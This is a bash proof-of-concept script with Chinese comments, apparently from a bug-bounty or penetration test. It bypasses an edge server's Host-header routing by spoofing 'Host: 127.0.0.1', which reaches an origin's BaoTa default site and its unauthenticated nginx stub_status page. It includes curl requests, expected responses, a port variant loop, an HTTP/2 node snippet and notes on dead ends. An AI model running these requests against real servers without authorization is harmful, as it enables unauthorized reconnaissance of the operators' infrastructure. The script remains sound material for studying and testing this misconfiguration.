#!/usr/bin/env bash
# 边缘 Host 头路由绕过 → 源站宝塔默认站点 → 未授权 nginx stub_status
# 前置：URL 与 SNI 保持真实域名，只有 Host 头(:authority)被改成 127.0.0.1
# 全程低频（<=3 req/s），每个变体都留正常对照

HOST="target485.example.com"          # 用于 --resolve 与 SNI 的真实主机名
EDGE="192.0.2.5"             # 已知边缘 IP；未知时可省略 --resolve 走 DNS
BASE="https://${HOST}"
RES="--resolve ${HOST}:443:${EDGE}"
CURL="curl -sS -k --noproxy * ${RES}"

echo "=== [0] 基线：正常 Host，主站 SPA ==="
$CURL -o /dev/null -D - "${BASE}/nginx_status" | head -5
# 期望：200 + Content-Type: text/html ... + 约 3.3KB 的 SPA index

echo "=== [1] 伪造 Host: 127.0.0.1，暴露宝塔默认站点 ==="
$CURL -H "Host: 127.0.0.1" -D - "${BASE}/" | head -8
# 期望：200 + Content-Length 约 1326 + <title>没有找到站点</title>
#       响应头 ETag 形如 W/"59005463-52e"、Last-Modified 为 2017 年 → 宝塔默认页

echo "=== [2] 默认站上的 stub_status（核心payload）==="
$CURL -H "Host: 127.0.0.1" -D - "${BASE}/nginx_status"
# 期望：200 + Content-Type: text/plain
#       Active connections: N
#        server accepts handled requests
#        <accepts> <handled> <requests>
#        Reading: X Writing: Y Waiting: Z

echo "=== [3] 印证 docroot 是宝塔默认 html 目录 ==="
$CURL -H "Host: 127.0.0.1" -D - "${BASE}/50x.html" | head -5
# 期望：200 + 约 497B + <title>Error</title>（nginx 自带 50x 页）

# ---- 变体矩阵（端口可任意；h2 用 :authority 等价，SNI 仍为真实域名）----
# for p in 80 443 8888; do curl -sS -k --noproxy '*' -H "Host: 127.0.0.1" "https://${HOST}:${p}/nginx_status"; done

# HTTP/2 复核（node，ALPN=h2）：
# const http2=require('http2'),tls=require('tls');
# const c=http2.connect('https://'+HOST+':443',{createConnection:()=>tls.connect({host:EDGE,servername:HOST,ALPNProtocols:['h2'],rejectUnauthorized:false})});
# c.on('response',h=>console.log(h[':status'],h['content-type']));
# const r=c.request({':authority':'127.0.0.1',':path':'/nginx_status',':method':'GET'}); r.end();

# ---- 已证否 / 边界（省下一轮额度）----
# - 默认站无 PHP 文件：/phpinfo.php、/index.php 均 nginx 404
# - 无 DAV/PUT：非 GET/HEAD 一律 405
# - /._user.ini、/404 等其余路径均为 nginx 404，无面板页
# - 仅 GET /HEAD 有输出；别指望从这条直通代码执行

exit 0
